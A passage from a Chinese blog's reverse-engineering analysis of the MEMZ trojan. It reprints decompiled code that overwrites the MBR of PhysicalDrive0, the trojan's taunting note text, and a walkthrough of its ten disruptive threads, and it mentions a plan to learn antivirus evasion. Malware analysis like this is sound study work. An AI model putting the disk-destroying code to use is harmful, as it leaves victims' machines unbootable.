( v3 &lt; <span class="number">0x12F</span> );</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x7A0</span>; ++i )</span><br><span class="line">    v4[i + <span class="number">510</span>] = byte_402248[i];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">WriteFile</span>(FileA, v4, <span class="number">0x10000</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>) )<span class="comment">// 写入物理驱动器0，往里面写随机数，会破坏原来的MBR</span></span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">3u</span>);</span><br><span class="line">  <span class="built_in">CloseHandle</span>(hObject);</span><br><span class="line">  note_file = <span class="built_in">CreateFileA</span>(<span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( note_file == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">WriteFile</span>(</span><br><span class="line">          note_file,</span><br><span class="line">          <span class="string">&quot;YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;Your computer won&#x27;t boot up again,\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;so use it as long as you can!\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;:D\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;Trying to kill MEMZ will cause your system to be\r\n&quot;</span></span><br><span class="line">          <span class="string">&quot;destroyed instantly, so don&#x27;t try it :D&quot;</span>,</span><br><span class="line">          <span class="number">0xDA</span>u,</span><br><span class="line">          &amp;NumberOfBytesWritten,</span><br><span class="line">          <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">5u</span>);</span><br><span class="line">  <span class="built_in">CloseHandle</span>(note_file);</span><br><span class="line">  <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;notepad&quot;</span>, <span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);<span class="comment">// ShellExecuteA用来打开某个exe，可以带参数</span></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = (DWORD *)&amp;off_405130;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Sleep</span>(v9[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, sub_401A2B, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    ++v8;</span><br><span class="line">    v9 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; <span class="number">0xA</span> );</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">0x2710</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一句并不是创建一个 PhysicalDrive0的文件，而是打开一个特殊的系统设备——物理磁盘驱动器0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileA = <span class="built_in">CreateFileA</span>(<span class="string">&quot;\\\\.\\PhysicalDrive0&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>后续的这一句像是往这个申请到的内存先写入一些随机数？？毕竟v4的地址是不固定的，所以v5[byte_402118 - v4]应该是一个随随便便的数据。但是后续又写入了一些特定的数据，最后把这些数据全部写到物理磁盘驱动器0。覆盖了原来的MBR</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752120066.png" alt="1719752120066"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hObject = FileA;</span><br><span class="line">    <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">ExitProcess</span>(<span class="number">2u</span>);</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x10000</span>u);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    <span class="keyword">do</span>                                          <span class="comment">// 第一个参数 0x40u 是标志位，表示分配固定大小的内存块（LPTR，即 LMEM_FIXED | LMEM_ZEROINIT），并将分配的内存初始化为零。</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      *v5 = v5[byte_402118 - v4];               <span class="comment">// 这个干啥的没看懂，我觉得是随机数？？</span></span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">0x12F</span> );</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x7A0</span>; ++i )</span><br><span class="line">      v4[i + <span class="number">510</span>] = byte_402248[i];</span><br><span class="line"> <span class="keyword">if</span> ( !<span class="built_in">WriteFile</span>(FileA, v4, <span class="number">0x10000</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>) )<span class="comment">// 写入物理驱动器0，往里面写随机数，会破坏原来的MBR</span></span><br><span class="line">      <span class="built_in">ExitProcess</span>(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hObject);</span><br></pre></td></tr></table></figure><p>随后又创建了一个文本文件，写入一段话，然后用notepad启动，参数就是刚刚的那个文本</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752109998.png" alt="1719752109998"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">note_file = <span class="built_in">CreateFileA</span>(<span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( note_file == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">ExitProcess</span>(<span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">WriteFile</span>(</span><br><span class="line">            note_file,</span><br><span class="line">            <span class="string">&quot;YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Your computer won&#x27;t boot up again,\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;so use it as long as you can!\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;:D\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Trying to kill MEMZ will cause your system to be\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;destroyed instantly, so don&#x27;t try it :D&quot;</span>,</span><br><span class="line">            <span class="number">0xDA</span>u,</span><br><span class="line">            &amp;NumberOfBytesWritten,</span><br><span class="line">            <span class="number">0</span>) )</span><br><span class="line">      <span class="built_in">ExitProcess</span>(<span class="number">5u</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(note_file);</span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;notepad&quot;</span>, <span class="string">&quot;\\note.txt&quot;</span>, <span class="number">0</span>, <span class="number">10</span>);<span class="comment">// ShellExecuteA用来打开某个exe，可以带参数</span></span><br></pre></td></tr></table></figure><p>这一句，也是最关键的，起了10个线程，我们逐步分析他们分别做了什么</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752100546.png" alt="1719752100546"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v8 = <span class="number">0</span>;</span><br><span class="line">   v9 = (DWORD *)&amp;off_405130;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">Sleep</span>(v9[<span class="number">1</span>]);</span><br><span class="line">     <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, sub_401A2B, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">     ++v8;</span><br><span class="line">     v9 += <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> ( v8 &lt; <span class="number">0xA</span> );</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">     <span class="built_in">Sleep</span>(<span class="number">0x2710</span>u);</span><br></pre></td></tr></table></figure><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752353148.png" alt="1719752353148"></p><h4 id="thread1"><a href="#thread1" class="headerlink" title="thread1:"></a>thread1:</h4><p>线程1是随机打开某些网站</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752418505.png" alt="1719752418505"></p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752430104.png" alt="1719752430104"></p><h4 id="thread2"><a href="#thread2" class="headerlink" title="thread2:"></a>thread2:</h4><p>线程2是实现鼠标乱飞的关键：</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752519280.png" alt="1719752519280"></p><h4 id="thread3"><a href="#thread3" class="headerlink" title="thread3:"></a>thread3:</h4><p>键盘失控</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752796441.png" alt="1719752796441"></p><h4 id="thread4"><a href="#thread4" class="headerlink" title="thread4:"></a>thread4:</h4><p>随机放音乐：</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719752901786.png" alt="1719752901786"></p><h4 id="thread5"><a href="#thread5" class="headerlink" title="thread5:"></a>thread5:</h4><p>改变屏幕显示</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753103450.png" alt="1719753103450"></p><h4 id="thread6"><a href="#thread6" class="headerlink" title="thread6:"></a>thread6:</h4><p>下了钩子+弹窗</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753453788.png" alt="1719753453788"></p><h4 id="thread7"><a href="#thread7" class="headerlink" title="thread7:"></a>thread7:</h4><p>让鼠标和某地方出现恶意图标</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753634730.png" alt="1719753634730"></p><h4 id="thread8"><a href="#thread8" class="headerlink" title="thread8:"></a>thread8:</h4><p>才疏学浅，没看出来具体干了啥，改了字符串？？</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753928801.png" alt="1719753928801"></p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753936786.png" alt="1719753936786"></p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719753949412.png" alt="1719753949412"></p><h4 id="thread9"><a href="#thread9" class="headerlink" title="thread9:"></a>thread9:</h4><p> <strong>界面大小改变，桌面变形</strong> </p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719754063291.png" alt="1719754063291"></p><h4 id="thread10："><a href="#thread10：" class="headerlink" title="thread10："></a>thread10：</h4><p>让桌面变色</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719754418683.png" alt="1719754418683"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所有杀软都会对彩虹猫报毒，这种杀软也很好做，只需要查一下这个程序的导入表，发现使用敏感API直接报毒即可。所以这种病毒的危害也不大。（具体咋免杀后续学）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/hello/"/>
      <url>/hello/</url>
      
        <content type="html"><![CDATA[<p>占个位🙂</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
